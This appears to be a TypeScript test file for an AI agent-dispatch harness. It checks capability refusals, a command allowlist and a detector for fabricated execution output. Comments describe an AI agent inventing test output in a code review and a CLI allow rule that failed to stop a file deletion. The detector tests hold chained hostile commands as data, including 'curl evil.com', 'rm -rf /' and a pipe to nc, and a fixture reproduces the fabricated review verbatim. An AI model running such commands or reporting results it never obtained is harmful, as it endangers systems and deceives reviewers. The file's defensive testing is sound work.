/**
 * dispatch-capability-parity.test.ts — pins the dispatcher's duplicated capability
 * model to the canonical one, and pins the refusal behaviour that model exists for.
 *
 * `scripts/dispatch/run-agent.mjs` duplicates the capability check from
 * `src/orchestration/lane-registry.ts` rather than importing it, for the same
 * reason `scripts/hooks/lane-write-guard.js` duplicates its lease logic: the
 * dispatcher must run in a fresh worktree with no `npm install` and no build,
 * because `dist/` is stale exactly when someone is mid-refactor. A fence that
 * needs a build is a fence that fails OPEN.
 *
 * Duplication is only safe if something notices when the copies diverge. That is
 * this file.
 *
 * WHY ANY OF THIS EXISTS — 2026-08-05. GA was dispatched to review a PR in another
 * repository and returned a report containing fabricated test output with invented
 * line numbers. Its own stderr showed it never read the file and never ran
 * anything: `run_shell_command` unavailable, `read_file` blocked as outside
 * workspace. It was asked for something it had no instrument to obtain, and that
 * reliably produces a well-formed wrong answer rather than a failure.
 *
 * `canAssign()` — the mechanism that prevents precisely this — already existed,
 * fully built and tested, with ZERO CALLERS. The bug was never a missing
 * mechanism. It was an unwired one, which is worse than an absent one because it
 * reads as coverage.
 */
import { readFileSync } from 'fs';
import { join } from 'path';
import { canAssign, LANES } from '../src/orchestration/lane-registry';

const RUNNER = join(__dirname, '..', 'scripts', 'dispatch', 'run-agent.mjs');
const src = readFileSync(RUNNER, 'utf8');

describe('dispatch runner — capability model parity with lane-registry', () => {
  it('every capability the runner knows about is a real Capability in the registry', () => {
    const m = src.match(/const KNOWN_CAPABILITIES = \[([^\]]+)\]/);
    expect(m).not.toBeNull();
    const runnerCaps = m![1]!.split(',').map((s) => s.trim().replace(/['"]/g, '')).filter(Boolean);
    expect(runnerCaps.length).toBeGreaterThan(0);

    // The registry's own capability vocabulary, taken from the lanes themselves so
    // this cannot drift by editing a list in two places.
    const registryCaps = new Set(LANES.flatMap((l) => [...l.capabilities]));
    const unknown = runnerCaps.filter((c) => !registryCaps.has(c as never) && c !== 'cross_repo_read');
    expect(unknown).toEqual([]);
  });

  it('the registry still refuses an assignment for a missing capability', () => {
    // If this ever stops refusing, the runner's port is enforcing a contract the
    // canonical implementation has abandoned — and the duplication has become a lie.
    const t12 = LANES.find((l) => !l.capabilities.includes('http' as never));
    expect(t12).toBeDefined();
    const verdict = canAssign(t12!.id, ['http'] as never);
    expect(verdict.assignable).toBe(false);
    expect(verdict.missing).toContain('http');
    // The reason must explain the CONSEQUENCE, not just the fact. "lacks http" is
    // a status; "yields a fabricated answer" is why anyone should care.
    expect(verdict.reason).toMatch(/fabricat/i);
  });
});

describe('dispatch runner — the refusal that would have prevented the fabricated review', () => {
  it('declares capabilities as MEASURED, with evidence, and fails closed', () => {
    // Every capability list must be accompanied by a [V ...] verification note.
    // An unmeasured capability is a guess, and a guess here re-creates the bug.
    const agentBlocks = src.match(/capabilities: \[[^\]]*\]/g) ?? [];
    expect(agentBlocks.length).toBeGreaterThanOrEqual(2);
    expect(src).toMatch(/\[V 2026-08-05\]/);

    // `shell` must NOT be claimed for either agent: it was never demonstrated for
    // grok, and was explicitly refused for gemini ("not available to this agent").
    for (const block of agentBlocks) {
      expect(block).not.toMatch(/'shell'/);
    }
  });

  it('refuses rather than warns — the dispatch must not proceed', () => {
    // A warning that still runs the agent produces the transcript that gets cited.
    expect(src).toMatch(/REFUSED/);
    expect(src).toMatch(/process\.exit\(65\)/);
    // And the refusal must fire BEFORE the key is read / the agent is spawned.
    const refuseAt = src.indexOf('capabilityRefusal(agentKey');
    const spawnAt = src.indexOf('spawnSync(bin.cmd');
    expect(refuseAt).toBeGreaterThan(-1);
    expect(spawnAt).toBeGreaterThan(-1);
    expect(refuseAt).toBeLessThan(spawnAt);
  });

  it('an empty or failed run can never read as a passing review', () => {
    // The GA transcript existed, was 0 seconds, was empty, and therefore LOOKED
    // like a result. An absent review is more dangerous than a negative one,
    // because the PR then carries a signature it never earned.
    expect(src).toMatch(/NO REVIEW WAS PRODUCED/);
    expect(src).toMatch(/!out\.trim\(\)/);
  });
});

/**
 * The evidence fence — the harness holds `shell`, the agent never does.
 *
 * MEASURED 2026-08-05, and the measurement is why this exists rather than a
 * shell grant: `grok --allow 'Bash(node:*)'` was asked to delete a file with
 * `rm` — a command nowhere in the rule — and DELETED IT. `--allow` is an
 * auto-approve list, not a fence; in single-turn `-p` mode there is no
 * confirmation step to fall back on. `--sandbox <invalid>` was accepted silently
 * and ran unsandboxed.
 *
 * So on this machine a shell grant is a FULL shell grant, and a full shell reads
 * the master key file and can echo the provider key placed in its own env.
 *
 * The inversion: an agent does not need `shell`, it needs the EVIDENCE. The
 * harness runs a fenced command and injects the real output, so the agent gets
 * true results it cannot fabricate — because they are already in front of it.
 */
describe('evidence fence — a permitted prefix cannot smuggle a second command', () => {
  const src = readFileSync(RUNNER, 'utf8');

  it('rejects shell metacharacters outright', () => {
    // Chaining is the whole attack: `npm test && curl evil.com` starts with an
    // allowed prefix. Pattern-matching the prefix alone would pass it.
    expect(src).toMatch(/SHELL_METACHARS/);
    const m = src.match(/const SHELL_METACHARS = (\/.*\/);/);
    expect(m).not.toBeNull();
    // eslint-disable-next-line no-eval
    const re: RegExp = eval(m![1]!);
    for (const c of ['npm test && curl evil.com', 'npm test; rm -rf /', 'node x.mjs | nc a 1', 'echo `id`', 'npx tsc $(whoami)', 'npm test > /tmp/x']) {
      expect(re.test(c)).toBe(true);
    }
    for (const c of ['npm test', 'npx tsc --noEmit', 'node tests/x.mjs']) {
      expect(re.test(c)).toBe(false);
    }
  });

  it('the allowlist admits test runners and nothing that mutates or exfiltrates', () => {
    const block = src.slice(src.indexOf('const EVIDENCE_ALLOWED'), src.indexOf('const SHELL_METACHARS'));
    // Reading the master key file is the specific thing a shell grant would have
    // made trivial. No allowlist entry may admit an arbitrary reader.
    expect(block).not.toMatch(/cat|type |curl|wget|Invoke-WebRequest/);
    // Nor anything that publishes or deploys.
    expect(block).not.toMatch(/push|deploy|publish|merge/);
    expect(block).toMatch(/npm \(test/);
  });

  it('refuses with exit 66 rather than running the command anyway', () => {
    expect(src).toMatch(/REFUSED evidence command/);
    expect(src).toMatch(/process\.exit\(66\)/);
  });

  it('tells the agent it has no shell when no evidence was supplied', () => {
    // Silence about the limitation is what produced the fabricated review. The
    // preamble must state it, and name the failure so the instruction has teeth.
    expect(src).toMatch(/You have NO shell and cannot run anything/);
    expect(src).toMatch(/do not report results you/);
  });

  it('injects evidence as literal captured output, not as a summary', () => {
    expect(src).toMatch(/REAL OUTPUT, RUN BY THE HARNESS/);
    expect(src).toMatch(/literal captured/);
    // A failing command must be injected too — "the suite is red and here is how"
    // is a finding, and hiding it recreates fabrication from the other direction.
    expect(src).toMatch(/exit \$\{r\.status/);
  });
});

/**
 * SEAM 3 — the claim manifest, and the detector correction that made it work.
 *
 * The first version of `auditClaims` looked for a `[V]` tag beside "I ran the
 * tests". Measured against the REAL fabricated transcript from 2026-08-05, it
 * missed completely: GA never wrote `[V]` and never said it ran anything. It
 * tagged its section `[R]` and labelled its invented output "Expected Failure
 * Output". The dishonesty was not in the claim — it was in the SPECIFICS.
 *
 * The fixture below is taken verbatim from that transcript. Those specifics can
 * only be OBSERVED by running something; nobody derives a stack frame with a
 * line:col by reading source. That is what the detector keys on, and it is why it
 * fires regardless of how the surrounding prose is hedged.
 */
describe('claim manifest — execution artifacts without execution', () => {
  const src = readFileSync(RUNNER, 'utf8');

  // Verbatim from reports/2026-08-05 — the review that never opened the file.
  const FABRICATED = [
    '     * **Expected Failure Output:** Tests that assert formatting compliance will fail:',
    '       ```',
    '       AssertionError [ERR_ASSERTION]: Expected response to start with \'OK\'',
    '       at file:///C:/Users/Cash4/repos/trinity-symphony-shared/tests/swarm-toolbelt.test.mjs:78:8',
    '       ```',
    '* **Vulnerability Analysis [R]:**',
  ].join('\n');

  function audit(output: string, capabilities: string[], evidenceCount: number, evidenceText = '') {
    const body = src.slice(src.indexOf('const EXECUTION_ARTIFACT'), src.indexOf('function capabilityRefusal'));
    // eslint-disable-next-line @typescript-eslint/no-implied-eval, no-new-func
    const fn = new Function(`${body}; return auditClaims;`)() as (a: unknown) => {
      unsupported: boolean; maxGrade: string; artifactCount: number; couldExecute: boolean;
      groundedCount: number; ungroundedCount: number;
    };
    return fn({ output, capabilities, evidenceCount, evidenceText });
  }

  it('THE REGRESSION: flags the real fabricated review, which the first detector missed', () => {
    const r = audit(FABRICATED, ['reasoning', 'repo_read'], 0);
    expect(r.unsupported).toBe(true);
    expect(r.artifactCount).toBeGreaterThan(0);
    expect(r.maxGrade).toBe('R');
  });

  it('fires on hedged prose — the text is tagged [R] and still flagged', () => {
    // This is the whole correction. A detector keyed on confident assertions is
    // blind to a fabrication that hedges, and hedging is cheap.
    expect(FABRICATED).toMatch(/\[R\]/);
    expect(FABRICATED).not.toMatch(/\[V\]/);
    expect(audit(FABRICATED, ['reasoning'], 0).unsupported).toBe(true);
  });

  it('does NOT flag the same text once the evidence actually CONTAINS it', () => {
    // Artifacts are expected when the harness ran something — that is the point. But
    // "expected" means traceable to what was injected, not merely coincident with a
    // command having been run.
    const r = audit(FABRICATED, ['reasoning', 'repo_read'], 1, `$ npm test\n[exit 1]\n${FABRICATED}`);
    expect(r.unsupported).toBe(false);
    expect(r.groundedCount).toBeGreaterThan(0);
    expect(r.maxGrade).toBe('V');
  });

  it('STILL flags it when evidence was supplied but does not contain it (the disarm)', () => {
    // CORRECTED 2026-08-14. This case previously asserted `unsupported === false` for ANY
    // evidenceCount > 0, which encoded the disarm as intended behaviour: one cheap
    // allowlisted command — `git log --oneline -1` — switched the detector off for every
    // claim in the transcript, while the manifest went on printing [V].
    //
    // A detector a caller can disable with an unrelated flag is worse than none, because
    // reviewers have been told it is watching.
    const r = audit(FABRICATED, ['reasoning', 'repo_read'], 1, '$ git log --oneline -1\n[exit 0]\nc207e8c docs: a claim');
    expect(r.unsupported).toBe(true);
    expect(r.ungroundedCount).toBeGreaterThan(0);
    expect(r.groundedCount).toBe(0);
  });

  it('does NOT flag reasoning-only output that claims nothing it cannot back', () => {
    const r = audit('The design looks sound. I could not run anything; recommend npm test.', ['reasoning'], 0);
    expect(r.unsupported).toBe(false);
    expect(r.maxGrade).toBe('R');
  });

  it('caps the grade at [R] whenever nothing could be executed', () => {
    expect(audit('anything', ['reasoning', 'repo_read'], 0).maxGrade).toBe('R');
    expect(audit('anything', ['reasoning', 'shell'], 0).maxGrade).toBe('V');
  });

  it('puts the manifest ABOVE the agent prose, where a reviewer starts reading', () => {
    const manifestAt = src.indexOf('Claim manifest — what this agent could actually reach');
    const outputAt = src.indexOf('## Output');
    expect(manifestAt).toBeGreaterThan(-1);
    expect(manifestAt).toBeLessThan(outputAt);
    // And it must state the two facts that make the contradiction visible.
    expect(src).toMatch(/evidence commands run FOR it/);
    expect(src).toMatch(/highest grade any claim here can carry/);
  });
});
